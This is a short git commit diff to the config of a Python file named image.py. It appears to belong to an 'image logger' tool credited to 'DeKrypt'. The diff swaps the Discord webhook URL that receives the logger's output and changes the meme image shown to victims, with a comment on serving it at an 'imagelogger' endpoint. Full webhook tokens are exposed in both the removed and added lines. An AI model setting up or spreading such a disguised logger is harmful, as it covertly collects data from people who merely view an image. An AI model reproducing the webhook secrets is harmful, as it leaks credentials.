8838060d7f7f87a47cd789502a0a120e78d90b69
Taj147 <113844146+Taj147@users.noreply.github.com>
2025-08-19 13:42:50 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1374370196474826812/h7nlOVksVB1fx1m-acAZvmT6frmoneFSZ4FiawhhAnjKWI2eb6YHNAauewfkPvy0WOwf",
-    "image": "https://thehowler.org/wp-content/uploads/2018/01/roll-safe-meme-1.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1407343369922809958/sBlsfkM2up76IQCN2X957ZOgHoMXvSWREFosg2tGki2uYF5z71sCMXyJGGnQi_YblwXU",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS77Q_KDn4qMhcbSOhpPN0-BrjL9u7b1_ylCQ&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
